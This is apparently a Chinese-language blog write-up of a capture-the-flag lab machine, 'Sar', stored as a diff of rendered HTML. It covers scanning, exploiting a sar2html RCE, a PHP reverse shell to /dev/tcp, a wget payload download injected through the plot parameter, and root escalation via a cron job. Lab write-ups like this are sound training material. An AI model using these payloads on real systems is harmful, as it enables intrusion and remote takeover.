@@ -1,0 +1,94 @@
+I"C<h3 id="主机识别">主机识别</h3>
+
+<p><code class="language-plaintext highlighter-rouge">arp-scan -l</code></p>
+
+<h3 id="网络拓扑">网络拓扑</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>计算机</th>
+      <th>IP</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>本机（Win10）</td>
+      <td><code class="language-plaintext highlighter-rouge">192.168.1.110</code></td>
+    </tr>
+    <tr>
+      <td>Kali</td>
+      <td><code class="language-plaintext highlighter-rouge">192.168.1.112</code></td>
+    </tr>
+    <tr>
+      <td>Sar</td>
+      <td><code class="language-plaintext highlighter-rouge">192.168.1.105</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="扫描端口和版本信息">扫描端口和版本信息</h3>
+
+<p><code class="language-plaintext highlighter-rouge">nmap -A 192.168.1.105</code></p>
+
+<p><img src="https://i.loli.net/2020/05/30/wUL8qnS3jXK7Qi9.png" alt="1.png" /></p>
+
+<h3 id="访问-web-并确定-web-应用">访问 Web 并确定 Web 应用</h3>
+
+<p>根据 Nmap 扫描结果可知，Web 应用程序运行的是 <strong>Apache 2.4.29</strong> 服务器，并且只开启 <strong>80</strong> 端口</p>
+
+<p><img src="https://i.loli.net/2020/05/30/YZysnhUmbDCaVL6.png" alt="2.png" /></p>
+
+<p>使用 <em>dirb</em> 工具枚举目录</p>
+
+<p><img src="https://i.loli.net/2020/05/30/1pMIJvFlhEObocQ.png" alt="3.png" /></p>
+
+<p>访问 <code class="language-plaintext highlighter-rouge">robots.txt</code> 文件返回 <code class="language-plaintext highlighter-rouge">sar2HTML</code>，继续访问该路径发现服务器运行 <code class="language-plaintext highlighter-rouge">sar2html v3.2.1</code> Web 应用</p>
+
+<p><img src="https://i.loli.net/2020/05/30/aZny9kmdLClT53S.png" alt="4.png" /></p>
+
+<p>OSINT 查找该应用漏洞，发现一个 <strong>RCE</strong> 漏洞</p>
+
+<p><img src="https://i.loli.net/2020/05/30/cIWxdgYCHZfM3eG.png" alt="5.png" /></p>
+
+<p>接下来根据给出的信息利用 RCE 漏洞</p>
+
+<p><img src="https://i.loli.net/2020/05/30/w6reC7oH9PAkOGy.png" alt="6.png" /></p>
+
+<p>尝试直接反弹 shell 发现不行，那么就用 <code class="language-plaintext highlighter-rouge">wget</code> 工具下载 PHP 脚本到本地来反弹 shell</p>
+
+<p><img src="https://i.loli.net/2020/05/30/DKHeGV3MWYNm7iX.png" alt="7.png" /></p>
+
+<h3 id="getshell">Getshell</h3>
+
+<p>Kali 端创建 getshell.php 脚本</p>
+
+<pre><code class="language-php line-numbers">echo "&lt;?php system(\"bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.112/4455 0&gt;&amp;1'\");?&gt;" &gt; getshell.php
+</code></pre>
+
+<p>浏览器访问 <code class="language-plaintext highlighter-rouge">?plot=;wget http://192.168.1.112:8088/getshell.php</code>，这样虚拟机当前目录下就有 <em>getshell.php</em> 文件</p>
+
+<p>Kali 监听 <strong>4455</strong> 端口即可 getshell</p>
+
+<p><img src="https://i.loli.net/2020/05/30/YnC4g9VXP2eNict.png" alt="8.png" /></p>
+
+<p>在 <code class="language-plaintext highlighter-rouge">/home/love/Desktop/</code> 路径下发现 <code class="language-plaintext highlighter-rouge">user.txt</code> 文件，内容是 MD5 值：<code class="language-plaintext highlighter-rouge">427a7e47deb4a8649c7cab38df232b52</code>，经过解密得知是 <code class="language-plaintext highlighter-rouge">user.txt</code> 字符串的 MD5 值，后来尝试使用该密码登录虚拟机，却发现密码不对，想必这只是混淆视听并无用处</p>
+
+<p>接下来通过查找具有 SUID 权限的命令，发现 <code class="language-plaintext highlighter-rouge">ping</code> 、 <code class="language-plaintext highlighter-rouge">arping</code> 、<code class="language-plaintext highlighter-rouge">pkexec</code>和 <code class="language-plaintext highlighter-rouge">pppd</code>不是默认具有 SUID 权限的工具，因此可以尝试提权</p>
+
+<p><img src="https://i.loli.net/2020/05/30/3jWt54TeAhoM1Nb.png" alt="9.png" /></p>
+
+<h3 id="提权">提权</h3>
+
+<p>为了收集更多信息，还是上传 <em>LinEnum.sh</em> 脚本运行一下。发现存在一个定时任务执行<code class="language-plaintext highlighter-rouge">/var/www/html</code>目录下<code class="language-plaintext highlighter-rouge">finally.sh</code>脚本，并且是 <em>root</em> 账户下的定时任务</p>
+
+<p><img src="https://i.loli.net/2020/05/30/TI1QKxWfMbmEgBC.png" alt="10.png" /></p>
+
+<p>因此我们修改 <em>write.sh</em> 脚本即可提权</p>
+
+<p><img src="https://i.loli.net/2020/05/30/f8mH5qDeO3ix2np.png" alt="11.png" /></p>
+
+<p>Kali 监听 <strong>5566</strong> 端口后过一段时间即可获得 root 权限</p>
+
+<p><img src="https://i.loli.net/2020/05/30/JALqEfZhVbIs3Cz.png" alt="12.png" /></p>
+:ET
